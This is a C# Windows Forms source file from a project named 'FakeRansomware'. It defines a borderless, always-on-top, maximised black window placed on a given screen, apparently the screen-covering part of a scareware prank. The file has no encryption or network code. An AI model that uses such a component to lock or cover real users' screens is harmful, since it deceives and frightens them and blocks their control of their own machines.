using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FakeRansomware
{
    public partial class BlackWindow : Form
    {
        Screen currentScreen;
        public BlackWindow(Screen s)
        {
            currentScreen = s;
            InitializeComponent();
        }

        private void BlackWindow_Load(object sender, EventArgs e)
        {
            this.Location = currentScreen.WorkingArea.Location;
            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
        }
    }
}
